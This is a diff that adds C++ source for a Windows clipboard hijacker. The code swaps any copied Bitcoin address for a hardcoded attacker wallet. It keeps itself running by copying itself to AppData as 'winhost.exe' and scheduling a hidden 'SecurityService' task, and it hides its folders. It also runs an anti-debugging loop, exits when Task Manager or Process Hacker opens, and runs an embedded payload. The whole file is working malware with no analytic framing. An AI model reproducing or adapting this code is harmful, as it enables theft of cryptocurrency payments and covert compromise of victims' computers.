@@ -1,0 +1,128 @@
+#define WINVER 0x0501
+#define _WIN32_WINNT 0x0501
+#define _WIN32_WINDOWS 0x0501
+#define _WIN32_IE 0x0600
+
+bool WalletCheck( TCHAR *lpWallet ) {
+ 
+    size_t uLen = _tcslen( lpWallet );
+    if( uLen < 27 || uLen > 34 ) {
+        return false;
+    }
+ 
+    if( lpWallet[0] != '1' && lpWallet[1] != '3' ) {
+        return false;
+    }
+ 
+    for( size_t i = 0; i < uLen; i++ ) {
+ 
+        if( lpWallet[i] == '0' || lpWallet[i] == 'O' || lpWallet[i] == 'I' ) {
+            return false;
+        }
+ 
+        if( !isalpha( lpWallet[i] ) && !isdigit( lpWallet[i] ) ) {
+            return false;
+        }
+    }
+    return true;
+}
+ 
+void ReplaceWallet()
+{
+    HANDLE hData;
+ 
+    char szData[] = "1EfxP4KpXkgyjxevtXdPGLifBPorWk9KRt", *ptrData = NULL;
+ 
+    int nStrLen = strlen(szData);
+ 
+    hData = GlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, nStrLen + 1);
+ 
+    ptrData = (char*)GlobalLock(hData);
+ 
+    memcpy(ptrData, szData, nStrLen + 1);
+ 
+    GlobalUnlock(hData);
+ 
+    if (OpenClipboard(NULL))
+    {
+        EmptyClipboard();
+ 
+        SetClipboardData(CF_TEXT, hData);
+ 
+        CloseClipboard();
+    }
+}
+
+int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
+	for (int i = 0; i < 550000; i++)
+                OutputDebugStringW(L"");
+	char *pth = strcat(getenv("userprofile"), "\\AppData\\Roaming\\Microsoft\\Windows\\winhost.exe");
+	struct stat buffer;   
+  	if(stat (pth, &buffer) != 0)
+		rename("winhost.exe", pth);
+	string cmd = "schtasks /create /tn \\System\\SecurityService /tr %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\winhost.exe /st 00:00 /du 9999:59 /sc daily /ri 1 /f";
+	WinExec(cmd.c_str(), SW_HIDE);
+	WinExec("attrib +s +h %userprofile%\\AppData\\Roaming\\Microsoft\\Windows", SW_HIDE);
+	WinExec("attrib +s +h %userprofile%\\AppData\\Roaming\\Windows", SW_HIDE);
+	pth = "";
+	cmd = "";
+	Sleep(((rand() % 5 + 1) + 5) * 1000);
+	if (!isProcessRun("attrib.exe") && !isProcessRun("Taskmgr.exe") && !isProcessRun("taskmgr.exe") && !isProcessRun("ProcessHacker.exe"))
+	{
+
+		while (true)
+		{
+			if (isProcessRun("Taskmgr.exe") || isProcessRun("taskmgr.exe") || isProcessRun("ProcessHacker.exe"))
+			{
+				try
+				{
+					killProcess("attrib.exe");
+					exit(0);
+				}
+				catch (...)
+				{
+
+				}
+
+
+			}
+			
+			if (!isProcessRun("attrib.exe"))
+				RunPortableExecutable(rawData);
+			int i;
+ 
+        char *pchData;
+ 
+        if (OpenClipboard(NULL))  
+        {  
+            HANDLE hClipboardData = GetClipboardData(CF_TEXT);
+ 
+            if (hClipboardData)
+            {
+                pchData = (CHAR*) GlobalLock(hClipboardData);
+ 
+                if (pchData)
+                {  
+                    GlobalUnlock(hClipboardData);
+ 
+ 
+ 
+ 
+                    if ( WalletCheck( (TCHAR *)pchData ))
+                    {  
+                        ReplaceWallet();
+                    }
+                                       //else    cout << "error";
+ 
+                }
+            }
+ 
+            CloseClipboard();
+			Sleep(2000);
+		}
+
+	}
+
+	}
+return 0;
+}
